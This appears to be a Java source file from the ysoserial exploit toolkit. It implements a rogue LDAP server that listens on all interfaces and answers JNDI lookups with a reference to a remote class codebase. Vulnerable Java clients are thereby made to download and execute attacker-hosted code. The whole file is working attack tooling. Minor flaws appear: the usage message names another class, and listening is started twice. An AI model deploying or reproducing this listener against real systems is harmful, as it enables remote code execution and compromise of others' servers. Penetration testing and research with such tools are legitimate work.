package ysoserial.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import ysoserial.exploit.ldap.component.OperationInterceptor;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

public class LDAPRefListener {
    private InMemoryDirectoryServer ds;
    public LDAPRefListener(int lport, String url) {
        InMemoryDirectoryServerConfig config = null;
        try {
            URL urlParsed = new URL(url);
            String codebase = urlParsed.getProtocol() + "://" + urlParsed.getHost() + ":" + urlParsed.getPort() + "/";
            String objectName = urlParsed.getPath().substring(1).replace("/", ".");

            config = new InMemoryDirectoryServerConfig("dc=sgfsda,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                lport,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(codebase, objectName));
            ds = new InMemoryDirectoryServer(config);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() throws Exception {
        ds.startListening();
    }

    public static void main(String[] args)  throws Exception {
        if ( args.length != 2 ) {
            System.err.println(LDAPTomcatRefListener.class.getName() + " <port> <class_url_location>");
            System.exit(-1);
            return;
        }

        try {
            int port = Integer.parseInt(args[0]);
            LDAPRefListener ldapRefListener = new LDAPRefListener(port, args[1]);
            ldapRefListener.run();
        } catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }
}
